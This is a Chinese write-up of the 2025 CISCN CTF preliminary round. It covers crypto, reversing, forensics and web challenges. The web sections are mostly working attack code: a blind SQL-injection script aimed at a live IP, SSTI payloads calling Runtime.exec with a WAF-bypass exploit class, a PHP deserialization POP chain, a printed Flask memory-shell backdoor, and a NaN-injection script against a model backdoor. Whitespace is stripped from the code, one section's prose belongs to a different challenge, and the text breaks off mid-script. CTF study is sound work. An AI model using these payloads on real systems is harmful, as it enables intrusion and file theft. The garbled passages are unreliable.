@@ -1,0 +1,254 @@
+# 2025年第十九届全国大学生信息安全竞赛（ciscn）暨第三届长城杯网数智安全大赛—初赛WriteUp
+
+> 原文: https://www.ctfiot.com/290371.html
+> ID: 290371
+
+前言
+
+公众号
+
+欢迎关注公众号【Real返璞归真】，我们将不定期分享CTF、二进制安全、安卓逆向等领域的前沿知识与技术内容。
+
+题目附件
+
+📥 资料获取：公众号后台回复【ciscn2025】，一键打包下载所有题目附件和本地WriteUp：
+
+解题情况
+image-20251228204426246
+image-20251228204440960
+image-20251228204501390
+image-20251228204526590
+image-20251228204550306
+image-20251228204603776
+image-20251228204626845
+image-20251228204650047
+
+密码学
+
+ECDSA
+
+题目：
+
+#!/usr/bin/env python3fromecdsaimportSigningKey, NIST521pfromhashlibimportsha512fromCrypto.Util.numberimportlong_to_bytesimportrandomimportbinasciiimportsysdigest_int = int.from_bytes(sha512(b"Welcome to this challenge!").digest(),"big")curve_order = NIST521p.orderpriv_int = digest_int % curve_orderpriv_bytes = long_to_bytes(priv_int,66)sk = SigningKey.from_string(priv_bytes, curve=NIST521p)vk = sk.verifying_keyf_pub = open("public.pem","wb")f_pub.write(vk.to_pem())f_pub.close()defnonce(i): seed = sha512(b"bias"+ bytes([i])).digest() k = int.from_bytes(seed,"big") returnkmsgs = [b"message-"+ bytes([i])foriinrange(60)]sigs = []fori, msginenumerate(msgs): k = nonce(i) sig = sk.sign(msg, k=k) sigs.append((binascii.hexlify(msg).decode(), binascii.hexlify(sig).decode()))f_sig = open("signatures.txt","w")form, sinsigs: f_sig.write("%s:%sn"% (m, s))f_sig.close()
+
+题目的核心逻辑：
+
+私钥：d = sha512(b”Welcome to this challenge!”).int % n
+
+nonce：k(i) = sha512(b”bias” + bytes([i])).int
+
+对 60 条消息 b”message-” + bytes([i]) 依次签名，并写到 signatures.txt
+
+内层 RSA：取四个 512-bit 素数p1, q1, r1, s1，令n1 = p1*q1*r1*s1。给出密文c = m^e mod n1（e=65537），明文m为flag || random_padding，填充到 2048 bit，并保证n1 > m。
+
+外层模数：再造四个 1024-bit 素数p,q,r,s组成n = p*q*r*s。关键在于它们不是随机素数，而是用get_smooth_prime(1024, 20, max_prime=p1)这种方式生成：强行让p-1里包含对应的内层大素数（比如p1），剩下的部分由很多 20-bit 小素数组成（很平滑），最后取p = (这些因子乘积) + 1并要求为素数。
+
+p1 | n1
+
+“t | M（因为t` 只由 ≤B 的小素数组成）
+
+
+```
+#!/usr/bin/env python3fromecdsaimportSigningKey, NIST521pfromhashlibimportsha512fromCrypto.Util.numberimportlong_to_bytesimportrandomimportbinasciiimportsysdigest_int = int.from_bytes(sha512(b"Welcome to this challenge!").digest(),"big")curve_order = NIST521p.orderpriv_int = digest_int % curve_orderpriv_bytes = long_to_bytes(priv_int,66)sk = SigningKey.from_string(priv_bytes, curve=NIST521p)vk = sk.verifying_keyf_pub = open("public.pem","wb")f_pub.write(vk.to_pem())f_pub.close()defnonce(i): seed = sha512(b"bias"+ bytes([i])).digest() k = int.from_bytes(seed,"big") returnkmsgs = [b"message-"+ bytes([i])foriinrange(60)]sigs = []fori, msginenumerate(msgs): k = nonce(i) sig = sk.sign(msg, k=k) sigs.append((binascii.hexlify(msg).decode(), binascii.hexlify(sig).decode()))f_sig = open("signatures.txt","w")form, sinsigs: f_sig.write("%s:%sn"% (m, s))f_sig.close()
+```
+
+
+
+```
+fromhashlibimportsha1, sha512fromecdsaimportNIST521pn = NIST521p.orderL =66line = next(lnforlninopen("./signatures.txt","r", encoding="utf-8")ifln.strip())mhex, shex = line.strip().split(":")msg = bytes.fromhex(mhex)sig = bytes.fromhex(shex)i = msg[-1]k = int.from_bytes(sha512(b"bias"+ bytes([i])).digest(),"big") % nr = int.from_bytes(sig[:L],"big")s = int.from_bytes(sig[L:],"big")e = int.from_bytes(sha1(msg).digest(),"big")d = ((s * k - e) * pow(r,-1, n)) % nprint(hex(d))# 11786190273906782566706300546504742629011900435269701041731697414027484824601255112180676531145294320443777235338538357924760601782873554458995940394745073
+```
+
+
+
+```
+K ="012ab9c3478d56ef"deff(n): v5, v4 =0,1 for_inrange(n %24): v5, v4 = v4, (v5 + v4) &0xF returnK[v5]v11, flag =1,""foriinrange(32): flag += f(v11) + ("-"ifiin[7,12,17,22]else"") v11 = (v11 *8+ i +64) &0xFFFFFFFFFFFFFFFFprint(flag)# 10632674-1d219-09f29-14769-f60219a24
+```
+
+
+
+```
+fromCrypto.Util.numberimport*fromtqdmimporttqdmimportosflag=open("./flag.txt","rb").read()flag=bytes_to_long(flag+os.urandom(2048//8-len(flag)))e=65537defget_smooth_prime(bits, smoothness, max_prime=None): assertbits -2* smoothness >0 p =2 ifmax_prime!=None: assertmax_prime>smoothness p*=max_prime whilep.bit_length() < bits -2* smoothness: factor = getPrime(smoothness) p *= factor bitcnt = (bits - p.bit_length()) //2 whileTrue: prime1 = getPrime(bitcnt) prime2 = getPrime(bitcnt) tmpp = p * prime1 * prime2 iftmpp.bit_length() < bits: bitcnt +=1 continue iftmpp.bit_length() > bits: bitcnt -=1 continue ifisPrime(tmpp +1): p = tmpp +1 break returnpp1=getPrime(512)q1=getPrime(512)r1=getPrime(512)s1=getPrime(512)n1=p1*q1*r1*s1assertn1>flagp=get_smooth_prime(1024,20,p1)q=get_smooth_prime(1024,20,q1)r=get_smooth_prime(1024,20,r1)s=get_smooth_prime(1024,20,s1)n=p*q*r*sprint(f"[+] inner RSA modulus ={n1}")print(f"[+] outer RSA modulus ={n}")print(f"[+] Ciphertext ={pow(flag,e,n1)}")
+```
+
+
+
+```
+frommathimportgcdfromCrypto.Util.numberimportinverse, isPrime, long_to_bytesn1 =16141229822582999941795528434053604024130834376743380417543848154510567941426284503974843508505293632858944676904777719167211264225017879544879766461905421764911145115313698529148118556481569662427943129906246669392285465962009760415398277861235401144473728421924300182818519451863668543279964773812681294700932779276119980976088388578080667457572761731749115242478798767995746571783659904107470270861418250270529189065684265364754871076595202944616294213418165898411332609375456093386942710433731450591144173543437880652898520275020008888364820928962186107055633582315448537508963579549702813766809204496344017389879n =484831124108275939341366810506193994531550055695853253298115538101629337644848848341479419438032232339003236906071864005366050185096955712484824249228197577223248353640366078747360090084446361275032026781246854700074896711976487694783856878403247312312487197243272330518861346981470353394149785086635163868023866817552387681890963052199983782800993485245670437818180617561464964987316161927118605512017355921555464359512280368738197370963036482455976503266489446554327046948670215814974461717020804892983665655107351050779151227099827044949961517305345415735355361979690945791766389892262659146088374064423340675969505766640604405056526597458482705651442368165084488267428304515239897907407899916127394598273176618290300112450670040922567688605072749116061905175316975711341960774150260004939250949738836358264952590189482518415728072191137713935386026127881564386427069721229262845412925923228235712893710368875996153516581760868562584742909664286792076869106489090142359608727406720798822550560161176676501888507397207863998129261472631954482761264406483807145805232317147769145985955267206369675711834485845321043623959730914679051434102698588945009836642922614296598336035078421463808774940679339890140690147375340294139027290793c =657984921229942454933933403447729006306657607710326864301226455143743298424203173231485254106370042482797921667656700155904329772383820736458855765136793243316671212869426397954684784861721375098512569633961083815312918123032774700110069081262242921985864796328969423527821139281310369981972743866271594590344539579191695406770264993187783060116166611986577690957583312376226071223036478908520539670631359415937784254986105845218988574365136837803183282535335170744088822352494742132919629693849729766426397683869482842748401000853783134170305075124230522253670782186531697976487673160305610021244587265868919495629e =65537defprimes_upto(B): s = bytearray(b"x01") * (B +1) s[0:2] =b"x00x00" r = int(B**0.5) forpinrange(2, r +1): ifs[p]: s[p * p : B +1: p] =b"x00"* (((B - p * p) // p) +1) return[iforiinrange(2, B +1)ifs[i]]deflcm(a, b): returna // gcd(a, b) * bdefp1_stage1(N, A, B, base): x = pow(base, A, N) forpinprimes_upto(B): pe = p whilepe * p <= B: pe *= p x = pow(x, pe, N) g = gcd(x -1, N) if1< g < N: returng returnNonedeffactor(N, A, B=1<<20): ifN ==1: return[] ifisPrime(N): return[N] forbasein(2,3,5,7,11,13,17,19): g = p1_stage1(N, A, B, base) ifg: returnfactor(g, A, B) + factor(N // g, A, B) raiseSystemExit("fail")outer = factor(n, n1)inner = [gcd(p -1, n1)forpinouter]lam =1forpininner: lam = lcm(lam, p -1)d = inverse(e, lam)pt = long_to_bytes(pow(c, d, n1),256)formkin(b"flag{",b"FLAG{",b"ctf{",b"CISCN{",b"ciscn{"): i = pt.find(mk) ifi !=-1: j = pt.find(b"}", i) ifj !=-1: print(pt[i : j +1].decode()) break# flag = flag{fak3_r5a_0f_euler_ph1_of_RSA_040a2d35}
+```
+
+
+
+```
+bin/wasm2wat ~/Desktop/release.wasm -o ~/Desktop/release.wat
+```
+
+
+
+```
+import{ createHash }from"node:crypto";import{ authenticate }from"./build/release.js";constP ="ccaf33e3512e31f3";constu ="admin", p ="admin";constT =(x) =>(/^d+$/.test(x) ? +x :newDate(x).getTime());consts = T(process.argv[2] ??"2025-12-22T00:20:00+08:00");conste = T(process.argv[3] ??"2025-12-22T01:10:00+08:00");for(lett = s; t <= e; t++) {Date.now =()=>t;constj =JSON.stringify(JSON.parse(authenticate(u, p)));consth = createHash("md5").update(j).digest("hex");if(h.startsWith(P)) {console.log(h);break; }}
+```
+
+
+
+```
+node exp.js
+```
+
+
+
+```
+GDSC (4 bytes) - magicversion (4 bytes) - 0x65 = 101orig_len (4 bytes) - 解压后大小[zstd data] - ZSTD压缩的字节码
+```
+
+
+
+```
+importzstandardaszstddctx = zstd.ZstdDecompressor()decompressed = dctx.decompress(compressed_data)
+```
+
+
+
+```
+header (16 bytes): - identifier_count (4 bytes) - constant_count (4 bytes) - line_count (4 bytes) - token_length (4 bytes)identifiers: 每个: length (4 bytes) + chars (每个字符占4 bytes，需要XOR)constants: count (4 bytes) 每个:type(4 bytes) + data
+```
+
+
+
+```
+FanAglFanAglOoO!d458af702a680ae4d089ce32fc39945d
+```
+
+
+
+```
+func add_point(): Flag.key = Flag.key.replace("A","B")
+```
+
+
+
+```
+fromCrypto.CipherimportAESkey =b"FanBglFanBglOoO!"ct = bytes.fromhex("d458af702a680ae4d089ce32fc39945d")pt = AES.new(key, AES.MODE_ECB).decrypt(ct)print(pt)# b'wOW~youAregrEaT!'
+```
+
+
+
+```
+kworker 192.168.8.160:13337
+```
+
+
+
+```
+gSNFIZMf6ul.(*C9WNcDlbvKJZ).EncryptgSNFIZMf6ul.(*C9WNcDlbvKJZ).Decryptcrypto/cipher: incorrect GCM nonce size
+```
+
+
+
+```
+fromscapy.allimportrdpcap, TCP, RawfromCrypto.CipherimportAESimportbase64, reKEY =b'xfqGcVjrOWp5tUGCPFQq448nPDjILTe7'forpktinrdpcap('tcp.pcap'): ifTCPinpktandRawinpkt: raw = bytes(pkt[Raw].load) ifraw[:8] ==b'ET3RNUMX': enc = raw[12:] nonce, ct, tag = enc[:12], enc[12:-16], enc[-16:] pt = AES.new(KEY, AES.MODE_GCM, nonce=nonce).decrypt_and_verify(ct, tag) m = re.search(rb'MZWGCZ33[A-Z2-7]+=*', pt) ifm: print(base64.b32decode(m.group()).decode()) break # flag{b7c58700-2b01-4dd4-8526-a4a47a65a1a9}
+```
+
+
+
+```
+{"query":"-1' || if((TABLE information_schema.tables LIMIT 1)>('def','mysql','columns_pra',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1),exp(710),1)#"}
+```
+
+
+
+```
+importjsonimportrequestsimporttime# 配置url ='http://182.92.64.244:32845/search'defpost_text(payload): """发送payload并返回响应文本""" header = {"Content-Type":"application/json"} data = json.dumps({"query": payload}) try: resp = requests.post(url=url, data=data, headers=header, timeout=10) returnresp.text exceptExceptionase: print(f"请求错误:{e}") return"error"defcheck_condition(payload): """ 检查条件是否为真 返回: True (条件为真), False (条件为假), None (需要重试) """ result = post_text(payload) if"error"inresult.lower()or"频繁"inresult: # 频率限制，等待后重试 returnNone elif"Nexa"inresultor"success"inresult: # 有结果返回，条件为假 (因为用的是 > 比较) returnFalse else: # 无结果，条件为真 returnTruedefget_flag_char(position, current_value): """获取flag的第position个字符""" low =32 high =126 whilelow < high: mid = (low + high) //2 test_value = current_value + chr(mid) # 无列名注入：比较整个元组 # 如果 ('test_value') > (table where_is_my_flagggggg limit 0,1)，条件为真 payload =f"0' || if(('{test_value}')>(table where_is_my_flagggggg limit 0,1),exp(710),1) || '1'='1" # 发送请求 result =None retry_count =0 whileresultisNoneandretry_count <5: result = check_condition(payload) ifresultisNone: retry_count +=1 print(f" [!] 频率限制，等待重试 ({retry_count}/5)...") time.sleep(2) ifresultisNone: print(f" [!] 重试次数过多，跳过") returnNone ifresult: # 条件为真: test_value > flag_value # 说明 flag 的字符 < mid high = mid print(f" [{position}] '{chr(mid)}' ({mid}) -> flag < test, high={high}") else: # 条件为假: test_value <= flag_value # 说明 flag 的字符 >= mid low = mid +1 print(f" [{position}] '{chr(mid)}' ({mid}) -> flag >= test, low={low}") time.sleep(0.3) # 找到的字符 found_char = chr(low -1)iflow >32elseNone returnfound_chardefget_flag(): """获取完整的flag""" print("="*60) print("[*] 开始提取 flag") print("[*] 表名: where_is_my_flagggggg") print("="*60) flag ="" forposinrange(1,100): # 假设flag最长100字符 print(f"n[*] 获取第{pos}个字符...") char = get_flag_char(pos, flag) ifcharisNoneorord(char) <=32: print(f"n[*] 字符提取结束") break flag += char print(f"n[+] 当前 flag:{flag}") # 如果遇到 } 可能是flag结束 ifchar =='}': print("n[*] 检测到 '}', flag可能已完整") break returnflagdefget_flag_v2(): """ 使用另一种比较方式获取flag 比较逻辑: 如果 flag > test_value，返回error """ print("="*60) print("[*] 开始提取 flag (方法2)") print("[*] 表名: where_is_my_flagggggg") print("="*60) flag ="" forposinrange(1,100): print(f"n[*] 获取第{pos}个字符...") low =32 high =127 whilelow < high: mid = (low + high) //2 test_value = flag + chr(mid) # 使用 < 比较: 如果 (table) < (test_value)，触发exp(710) payload =f"0' || if((table where_is_my_flagggggg limit 0,1)<('{test_value}'),exp(710),1) || '1'='1" result = post_text(payload) time.sleep(0.4) if"error"inresult.lower()and"频繁"notinresult: # exp(710) 触发，条件为真: flag < test_value high = mid print(f" '{chr(mid)}' -> flag < test") elif"频繁"inresult: print(" [!] 频率限制，等待...") time.sleep(2) continue else: # 条件为假: flag >= test_value low = mid +1 print(f" '{chr(mid)}' -> flag >= test") iflow <=33: print("n[*] 提取结束") break char = chr(low -1) flag += char print(f"n[+] 第{pos}个字符: '{char}' | 当前flag:{flag}") ifchar =='}': break returnflagif__name__ =="__main__": print("SQL盲注脚本 - 无列名注入提取flag") print("目标表: where_is_my_flagggggg") print("-"*60) # 使用方法2（更稳定） flag = get_flag_v2() print("n"+"="*60) print(f"[*] 最终 flag:{flag}") print("="*60)
+```
+
+
+
+```
+${T(java.lang.Runtime).getRuntime().exec('whoami')}
+```
+
+
+
+```
+//列目录''.getClass().forName('java.nio.file.Files').walk( ''.getClass().forName('java.nio.file.Paths').get('/'), 1).collect( ''.getClass().forName('java.util.stream.Collectors').toList() )// 原始Files.readAllLines(Paths.get("/flag"))// 反射 + 混淆''.getClass().forName('java.nio.file.Files') .readAllLines( ''.getClass().forName('java.nio.file.Paths').get('/'+'fla'+'g'+'_y0u_d0nt_kn0w')))
+```
+
+
+
+```
+#!/usr/bin/env python3# -*- coding: utf-8 -*-importrequestsimportreimportloggingfromtypingimportOptional, List# ================= 配置区域 =================TARGET_URL ="http://8.147.132.32:32080"USER_CREDENTIALS = ("admin","admin123")# ===========================================# 配置日志logging.basicConfig(level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s')logger = logging.getLogger(__name__)classBypassUtil: """ 专门处理 WAF 绕过的工具类 """ @staticmethod defobfuscate_string(text: str)-> str: """ 核心绕过技巧：将字符串拆解拼接 输入: "flag" 输出: 'f'+'l'+'a'+'g' 原理: 只有最终在 Java 内存中拼接时才会出现敏感词，绕过 HTTP 层的流量检测 """ ifnottext: return"''" # 将每个字符用单引号包裹，并用 + 连接 return"+".join([f"'{char}'"forcharintext])classSSTIGenerator: """ 生成基于反射的 SSTI Payload """ @staticmethod defget_class(class_name: str)-> str: """ 生成获取类的反射代码 原理: ''.getClass().forName('java.lang.Runtime') """ obfuscated_name = BypassUtil.obfuscate_string(class_name) returnf"''.getClass().forName({obfuscated_name})" @staticmethod defgen_list_dir_payload(path: str ="/")-> str: """ 生成列目录 Payload (基于 java.nio.file.Files.walk) """ cls_files = SSTIGenerator.get_class("java.nio.file.Files") cls_paths = SSTIGenerator.get_class("java.nio.file.Paths") cls_collectors = SSTIGenerator.get_class("java.util.stream.Collectors") target_path = BypassUtil.obfuscate_string(path) # 构造复杂的 Java Stream 调用链 payload = ( f"[[${{" f"{cls_files}.walk({cls_paths}.get({target_path}), 1)" f".collect({cls_collectors}.toList())" f"}}]]" ) returnpayload @staticmethod defgen_read_file_payload(file_path: str)-> str: """ 生成读文件 Payload (基于 java.nio.file.Files.readAllLines) """ cls_files = SSTIGenerator.get_class("java.nio.file.Files") cls_paths = SSTIGenerator.get_class("java.nio.file.Paths") target_path = BypassUtil.obfuscate_string(file_path) payload = ( f"[[${{" f"{cls_files}.readAllLines({cls_paths}.get({target_path}))" f"}}]]" ) returnpayloadclassSSTIExploit: def__init__(self, base_url: str): self.base_url = base_url.rstrip('/') self.session = requests.Session() # 常见 CTF 场景通常没有 HTTPS 证书，禁用警告 self.session.verify =False importurllib3 urllib3.disable_warnings() deflogin(self, username, password)-> bool: logger.info("尝试登录系统...") try: resp = self.session.post( f"{self.base_url}/login", data={"username": username,"password": password}, timeout=10 ) ifresp.status_code ==200: logger.info("登录成功") returnTrue logger.error(f"登录失败: HTTP{resp.status_code}") returnFalse exceptExceptionase: logger.error(f"登录异常:{e}") returnFalse defsend_payload(self, payload: str, tag: str)-> Optional[str]: """ 发送 Payload 并解析回显 """ logger.info(f"发送 Payload [{tag}]...") # logger.debug(f"Payload Content: {payload}") # 调试时可开启 try: resp = self.session.post( f"{self.base_url}/admin/preview", data={"template": payload}, timeout=10 ) # 使用正则提取 <div class="notice"> 中的内容 # 这里优化了正则，兼容换行符 (re.DOTALL) match = re.search(r'<div class="notice">(.*?)</div>', resp.text, re.DOTALL) ifmatch: raw_result = match.group(1).strip() # 简单的 HTML 反转义 result = raw_result.replace('&lt;','<').replace('&gt;','>').replace('&quot;','"') returnresult else: logger.warning("未匹配到预期回显 (可能 Payload 执行出错或无输出)") returnNone exceptExceptionase: logger.error(f"请求发送失败:{e}") returnNone defrun(self): # 1. 登录 ifnotself.login(*USER_CREDENTIALS): return # 2. 探测: 使用反射列出根目录 # 这里不需要手动拼接 'f'+'lag'，SSTIGenerator 会自动处理 logger.info("步骤 1: 尝试列出根目录寻找 Flag 文件") dir_payload = SSTIGenerator.gen_list_dir_payload("/") dir_result = self.send_payload(dir_payload,"List Root Dir") target_file =None ifdir_result: # 清理格式 [file1, file2] -> list files = dir_result.strip('[]').split(', ') logger.info(f"发现文件:{len(files)}个") forfinfiles: # 自动寻找包含 flag 关键字的文件 if'flag'inf.lower(): target_file = f logger.info(f"👉 发现疑似 Flag 文件:{f}") # 找到一个就停止吗？通常 CTF 只有一个 flag break # 3. 攻击: 读取目标文件 iftarget_file: logger.info(f"步骤 2: 读取文件{target_file}") # 自动生成读取 Payload (自动混淆路径) read_payload = SSTIGenerator.gen_read_file_payload(target_file) flag_content = self.send_payload(read_payload,"Read Flag") ifflag_content: print("n"+"#"*50) print(f"🎉 FLAG 内容:{flag_content}") print("#"*50+"n") else: logger.error("读取失败，未获取到内容") else: logger.error("未在根目录找到 flag 文件，可能在其他路径或文件名不同")if__name__ =="__main__": exploit = SSTIExploit(TARGET_URL) exploit.run()
+```
+
+
+
+```
+<?phperror_reporting(0);classA{ public$handle; publicfunctiontriggerMethod(){ echo"".$this->handle; }}classB{ public$worker; public$cmd; publicfunction__toString(){ return$this->worker->result; }}classC{ public$cmd; publicfunction__get($name){ echofile_get_contents($this->cmd); }}$raw =isset($_POST['data']) ? $_POST['data'] :'';header('Content-Type: image/jpeg');readfile("muzujijiji.jpg");highlight_file(__FILE__);$obj = unserialize($_POST['data']);$obj->triggerMethod();
+```
+
+
+
+```
+<?phpclassA{ public$handle;}classB{ public$worker; public$cmd;}classC{ public$cmd;}// 构造 POP 链$c =newC();$c->cmd ="/flag"; // 要读取的文件，根据实际情况修改，如 /etc/passwd 或 flag.php$b =newB();$b->worker = $c;$a =newA();$a->handle = $b;// 生成 payloadechourlencode(serialize($a));
+```
+
+
+
+```
+globalexc_classglobalcodeimportos,binasciiexc_class, code = app._get_exc_class_and_code(404)RC4_SECRET =b'v1p3r_5tr1k3_k3y'defrc4_crypt(data: bytes, key: bytes)-> bytes: S = list(range(256)) j =0 foriinrange(256): j = (j + S[i] + key[i % len(key)]) %256 S[i], S[j] = S[j], S[i] i = j =0 res = bytearray() forcharindata: i = (i +1) %256 j = (j + S[i]) %256 S[i], S[j] = S[j], S[i] res.append(char ^ S[(S[i] + S[j]) %256]) returnbytes(res)defbackdoor_handler(): ifrequest.headers.get('X-Token-Auth') !='3011aa21232beb7504432bfa90d32779': return"Error" enc_hex_cmd = request.form.get('data') ifnotenc_hex_cmd: return"" try: enc_cmd = binascii.unhexlify(enc_hex_cmd) cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode('utf-8', errors='ignore') output_bytes = getattr(os,'popen')(cmd).read().encode('utf-8', errors='ignore') enc_output = rc4_crypt(output_bytes, RC4_SECRET) returnbinascii.hexlify(enc_output).decode() except: return"Error"app.error_handler_spec[None][code][exc_class]=lambdaerror: backdoor_handler()
+```
+
+
+
+```
+importos,binasciiRC4_SECRET =b'v1p3r_5tr1k3_k3y'defrc4_crypt(data: bytes, key: bytes)-> bytes: S = list(range(256)) j =0 foriinrange(256): j = (j + S[i] + key[i % len(key)]) %256 S[i], S[j] = S[j], S[i] i = j =0 res = bytearray() forcharindata: i = (i +1) %256 j = (j + S[i]) %256 S[i], S[j] = S[j], S[i] res.append(char ^ S[(S[i] + S[j]) %256]) returnbytes(res)enc_cmd = binascii.unhexlify("e0ac7e52fc996cc2038c2d7a3899ed")cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode('utf-8', errors='ignore')print(cmd)
+```
+
+
+
+```
+ip.addr ==192.168.1.201&& tcp.port ==58782ip.addr ==192.168.1.201&& tcp.port ==58782&& tcp.len >0ip.addr ==192.168.1.201&& tcp.port ==58782&& tcp.len ==4
+```
+
+
+
+```
+importstructclassRand: def__init__(s, seed): s.r = [0]*32; s.r[1] = seed &0xFFFFFFFF foriinrange(2,32): s.r[i] = (16807*s.r[i-1]) %2147483647 s.f, s.b =4,1 for_inrange(310): s.rand() defrand(s): v = (s.r[s.f] + s.r[s.b]) &0xFFFFFFFF s.r[s.f] = v s.f =1ifs.f>=31elses.f+1 s.b =1ifs.b>=31elses.b+1 return(v>>1) &0x7FFFFFFFdefgen_key(seed): rng = Rand(seed) returnb''.join(struct.pack('<I', rng.rand())for_inrange(4))seed =0x46209534key = gen_key(seed)print(key.hex())# f71d894505e855068da9b6397ebb2b70
+```
+
+
+
+```
+ip.addr == 192.168.1.201 && tcp.port == 58782 && tcp.len > 0
+```
+
+
+
+```
+importstruct# 魔改S盒 (从IDA 0x2020提取)SBOX = bytes([0xd6,0x90,0xe9,0xfe,0xcc,0xe1,0x3d,0xb7,0x16,0xb6,0x14,0xc2,0x28,0xfb,0x2c,0x05,0x2b,0x67,0x9a,0x76,0x2a,0xbe,0x04,0xc3,0xaa,0x44,0x13,0x26,0x49,0x86,0x06,0x99,0x9c,0x42,0x50,0xf4,0x91,0xef,0x98,0x7a,0x33,0x54,0x0b,0x43,0xed,0xcf,0xac,0x62,0xe4,0xb3,0x1c,0xa9,0xc9,0x08,0xe8,0x95,0x80,0xdf,0x94,0xfa,0x75,0x8f,0x3f,0xa6,0x47,0x07,0xa7,0xfc,0xf3,0x73,0x17,0xba,0x83,0x59,0x3c,0x19,0xe6,0x85,0x4f,0xa8,0x68,0x6b,0x81,0xb2,0x71,0x64,0xda,0x8b,0xf8,0xeb,0x0f,0x4b,0x70,0x56,0x9d,0x35,0x1e,0x24,0x0e,0x5e,0x63,0x58,0xd1,0xa2,0x25,0x22,0x7c,0x3b,0x01,0x21,0x78,0x87,0xd4,0x00,0x46,0x57,0x9f,0xd3,0x27,0x52,0x4c,0x36,0x02,0xe7,0xa0,0xc4,0xc8,0x9e,0xea,0xbf,0x8a,0xd2,0x40,0xc7,0x38,0xb5,0xa3,0xf7,0xf2,0xce,0xf9,0x61,0x15,0xa1,0xe0,0xae,0x5d,0xa4,0x9b,0x34,0x1a,0x55,0xad,0x93,0x32,0x30,0xf5,0x8c,0xb1,0xe3,0x1d,0xf6,0xe2,0x2e,0x82,0x66,0xca,0x60,0xc0,0x29,0x23,0xab,0x0d,0x53,0x4e,0x6f,0xd5,0xdb,0x39,0xb8,0x31,0x11,0x0c,0x5a,0xcb,0x3e,0x0a,0x45,0xe5,0x94,0x77,0x5b,0x8d,0x6d,0x48,0x41,0x10,0xbd,0x09,0xc1,0x4a,0x89,0x0d,0x6e,0x97,0xa1,0x1d,0x16,0x0a,0xd9,0x88,0x6a,0x96,0xd1,0x6b,0x32,0x02,0x35,0x46,0x06,0x7d,0x65,0x49,0x8c,0xf0,0x3e,0x2d,0x7a,0x15,0xff,0x05,0x8e,0x01,0x84,0x3c,0x3a,0x38,0x53,0x87,0x7b,0x0b,0x2b,0x7e,0x0f,0xf6,0x69,0xa8,0x5a,0xb5,0x4c,0x1b,0x39,0x7f,0x08,0x8d,0x1c])FK = [0xa3b1bac6,0x56aa3350,0x677d9197,0xb27022dc]CK = [0x00070e15,0x1c232a31,0x383f464d,0x545b6269,0x70777e85,0x8c939aa1,0xa8afb6bd,0xc4cbd2d9, 0xe0e7eef5,0xfc030a11,0x181f262d,0x343b4249,0x50575e65,0x6c737a81,0x888f969d,0xa4abb2b9, 0xc0c7ced5,0xdce3eaf1,0xf8ff060d,0x141b2229,0x30373e45,0x4c535a61,0x686f767d,0x848b9299, 0xa0a7aeb5,0xbcc3cad1,0xd8dfe6ed,0xf4fb0209,0x10171e25,0x2c333a41,0x484f565d,0x646b7279]rot =lambdax,n: ((x<<n)|(x>>(32-n)))&0xfffffffftau =lambdax: (SBOX[x&0xff]<<24)|(SBOX[(x>>8)&0xff]<<16)|(SBOX[(x>>16)&0xff]<<8)|SBOX[x>>24]L =lambdax: x^rot(x,2)^rot(x,10)^rot(x,18)^rot(x,24)Lp =lambdax: x^rot(x,13)^rot(x,23)defsm4_dec(ct, key): mk = [struct.unpack('>I', key[i*4:i*4+4])[0]foriinrange(4)] k = [mk[i]^FK[i]foriinrange(4)] rk = [] foriinrange(32): rk.append(k[0]^Lp(tau(k[1]^k[2]^k[3]^CK[i]))) k = k[1:] + [rk[-1]] pt =b'' forblkinrange(0, len(ct),16): x = [struct.unpack('>I', ct[blk+i*4:blk+i*4+4])[0]foriinrange(4)] foriinrange(31,-1,-1): x = x[1:] + [x[0]^L(tau(x[1]^x[2]^x[3]^rk[i]))] pt +=b''.join(struct.pack('>I', x[3-i])foriinrange(4)) pad = pt[-1] returnpt[:-pad]if1<=pad<=16elseptkey = bytes.fromhex("ac46fb610b313b4f32fc642d8834b456")ct = bytes.fromhex("7f4b0ef4806983f164af6f46b71d3fce1e3c0bd00c4dd162b72c156f0f3aecd2afcabf551e08380db6fd20316f8a2729")print(sm4_dec(ct, key).decode())# flag{6894c9ec-7l9b-46O5-82bf-4felde27738f}
+```
+
+
+
+```
+#!/usr/bin/env python3# -*- coding: utf-8 -*-"""AI 模型后门检测与利用工具 (Refactored)针对场景: JSON NaN 注入绕过风控/触发模型后门"""importjsonimportbase64importloggingimportrequestsimporturllib3fromdataclassesimportdataclassfromtypingimportOptional, Tuple# ==================== 配置区域 ====================@dataclassclassConfig: # 目标配置 BASE_URL: str ="http://127.0.0.1:5000"# 请替换为实际目标 IP API_ENDPOINT: str ="/api/predict" # 解密配置 XOR_KEY: str ="ctf_2025_key" # 请求配置 TIMEOUT: tuple = (5,30) USER_AGENT: str ="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"# ==================== 初始化设置 ====================# 禁用 SSL 警告urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)# 配置日志logging.basicConfig( level=logging.INFO, format='%(asctime)s - [%(levelname)s] - %(message)s', datefmt='%H:%M:%S')logger = logging.getLogger("FraudHunter")# ==================== 核心逻辑类 ====================classAIBackdoorExploit: def__init__(self, config: Config): self.config = config self.target_url =f"{config.BASE_URL.rstrip('/')}{config.API_ENDPOINT}" def_get_raw_nan_payload(self)-> str: """ 构造包含原生 NaN 的非标准 JSON 字符串。 这种构造方式绕过了标准序列化器的潜在过滤。 """ # 这里的 NaN 是字面量，不是字符串 "NaN" return"""{ "trans_amount_usd": NaN, "addr_deviation_score": NaN, "trans_time_risk_score": NaN, "merchant_code_hash": NaN, "card_issuer_code": NaN, "pos_terminal_id": NaN, "transaction_type_code": NaN, "cvv_verify_score": NaN, "account_age_month": NaN, "daily_trans_count": NaN }""" deftrigger_backdoor(self)-> Tuple[Optional[str], Optional[str]]: """ 发送恶意负载触发后端逻辑漏洞 """ logger.info(f"正在尝试触发后门:{self.target_url}") headers = { "Content-Type":"application/json", "User-Agent": self.config.USER_AGENT } payload = self._get_raw_nan_payload() logger.debug(f"Payload Preview:{payload.replace(' ','').replace(chr(10),'')}") try: # 关键点: 使用 data 参数发送 raw string，而非 json 参数 response = requests.post( self.target_url, data=payload, headers=headers, timeout=self.config.TIMEOUT, verify=False ) logger.info(f"服务器响应:{response.status_code}") try: result = response.json() exceptjson.JSONDecodeError: logger.error("响应不是有效的 JSON 格式") logger.debug(response.text) returnNone,None # 检查后门触发标志 ifresult.get("backdoor_triggered"): logger.success("后门触发成功!")ifhasattr(logger,'success')elselogger.info(">>> 